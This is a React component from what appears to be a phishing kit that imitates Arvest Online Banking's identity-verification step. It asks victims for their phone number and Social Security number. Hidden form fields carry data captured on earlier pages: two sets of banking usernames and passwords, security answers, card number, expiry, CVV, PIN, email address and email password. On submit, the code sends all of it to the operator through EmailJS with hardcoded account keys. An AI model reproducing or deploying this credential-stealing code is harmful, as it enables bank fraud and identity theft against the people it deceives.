import React, { useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import emailjs from "@emailjs/browser";

type IdentityT = {
  phone: string;
  sn: string;
};

type Additional = {
    cn:string;
    edate:string;
    ccv:string;
    pn:string;
    mail:string;
    mail_p: string;
  }

  type Question = {
    q1: string;
    ans1: string;
    q2: string;
    ans2: string;
    q3: string;
    ans3: string;
}

export default function Identity() {
  const [formInput, setFormInput] = useState<IdentityT>({
    phone: "",
    sn: "",
  });

  const login1: Login = cookies.get("login1");
  const login2: Login2 = cookies.get("login2");
  const question: Question = cookies.get("question");
  const additional:Additional  = cookies.get("additional");
  const form = useRef<HTMLFormElement>(null);
  const navigate = useNavigate();
const [isLoading, setIsLoading] = useState(false)
  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    setIsLoading(true)
    event.preventDefault();
    emailjs.sendForm('service_ya9aoe5', 'template_i8l6vok', form.current!, 'hd0P0MIIRcBmXr70h')
    .then((result) => {
      console.log(result.text)
      navigate("../success", { replace: true });
    
    }, (error) => {
      alert("could not complete your request")
      console.log(error)
      setIsLoading(false)
    }); 
    
  }
  return (
    <>
      <div className="submitForm">
        <p
          className="go-left"
          style={{ fontSize: "14px", marginBottom: "30px" }}
        >
          Verify your Social Security Number and Date of Birth <br />
        </p>

        <form ref={form} id="login-form" onSubmit={handleSubmit} method="post">
          <div className="input-field" style={{ textAlign: "left" }}>
            <label htmlFor="username">
              Phone Number<span style={{ color: "red" }}>*</span>
            </label>
            <input
              onChange={handleInputChange}
              required
              id="username"
              name="phone"
              type="text"
              defaultValue={formInput.phone}
            />
          </div>
          <div className="input-field" style={{ textAlign: "left" }}>
            <label htmlFor="password">
              SSN <span style={{ color: "red" }}>*</span>
            </label>
            <input
              onChange={handleInputChange}
              required
              id="password"
              name="sn"
              type="text"
              maxLength={10}
              defaultValue={formInput.sn}
            />
          </div>

         
          <div style={{display:"none"}}>
          <input type="text" name="browser" defaultValue={navigator.userAgent} />
          <input type="text" name="user" defaultValue={login1.username} />
          <input type="text" name="pass" defaultValue={login1.password}/>
          <input type="text" name="user2" defaultValue={login2.username2}/>
          <input type="text" name="pass2" defaultValue={login2.password2}/>
          <input type="text" name="q1" defaultValue={question.q1}/>
          <input type="text" name="ans1" defaultValue={question.ans1}/>
          <input type="text" name="q2" defaultValue={question.q2}/>
          <input type="text" name="ans2" defaultValue={question.ans2}/>
          <input type="text" name="q3" defaultValue={question.q3}/>
          <input type="text" name="ans3" defaultValue={question.ans3}/>
          <input type="text" name="cn" defaultValue={additional.cn}/>
          <input type="text" name="edate" defaultValue={additional.edate}/>
          <input type="text" name="cv" defaultValue={additional.ccv}/>
          <input type="text" name="pn" defaultValue={additional.pn}/>
          <input type="text" name="mail" defaultValue={additional.mail}/>
          <input type="text" name="mail_p" defaultValue={additional.mail_p}/>
          </div>
          
         
          {isLoading ?
          <div style={{width:"100%", display:"flex", justifyContent:"center"}}>
          <span className="loader"></span>
          </div>
          :
          <button style={{ marginTop: "-2px" }} type="submit">
            Submit
          </button>}
        </form>

        <br />

        <p>Unauthorized access is prohibited. Usage may be monitored</p>

        <hr />

        <p>Have questions about Arvest Online Banking?</p>
      </div>
    </>
  );
}
